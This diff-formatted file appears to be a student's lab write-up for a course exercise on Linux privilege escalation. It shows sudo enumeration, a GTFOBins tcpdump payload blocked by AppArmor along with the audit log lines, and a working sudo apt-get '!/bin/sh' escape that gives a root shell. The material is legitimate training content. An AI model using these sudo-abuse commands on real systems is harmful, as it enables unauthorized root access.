@@ -1,0 +1,47 @@
+Questions 1
+Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which kernel modules enforce MAC policies to further protect the system?
+
+ssh joe@192.168.185.214
+
+# Check the sudo privilege
+sudo -l
+(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+
+# We notice that only crontab jobs, tcpdump, and apt-get utilities are listed as allowing sudo commands.
+
+# Since the first of the three permitted commands does not allow us to edit any crontab, it's unlikely that we could use this to find any escalation route. The second command looks more promising, so let's browse GTFObins3 for suggestions on how to abuse it.
+
+https://gtfobins.github.io/gtfobins/tcpdump/#command
+
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+...
+compress_savefile: execlp(/tmp/tmp.2pCVebDdMW, /dev/null) failed: Permission denied
+...
+
+# Although we had followed to the GTFObins exploit command but it seem failed to permissions
+
+# We can check the syslog for any occurrence of the tcpdump
+...
+May  3 03:39:55 debian-privesc kernel: [ 1564.269409] audit: type=1400 audit(1714725595.311:24): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.9f7STTqBMw" pid=4351 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
+May  3 03:41:05 debian-privesc kernel: [ 1634.413472] audit: type=1400 audit(1714725665.455:25): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.2pCVebDdMW" pid=4488 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
+...
+
+# We can notice that audit darmon has logged our privilege escalation attempt. Closer inspection reveals that AppArmor was triggered and blocked us
+
+# AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10. We can verify AppArmor's status as the root user using the aa-status command.
+
+# We still have the last command for abusing the sudo command '/usr/bin/apt-get'
+https://gtfobins.github.io/gtfobins/apt-get/#sudo
+sudo apt-get changelog apt
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# Now we managed to obtain a privileged root shell by abusing a misconfigured sudo configuration.
+
+# Back to the questions 'Which kernel modules enforce MAC policies to further protect the system?" 
+AppArmor
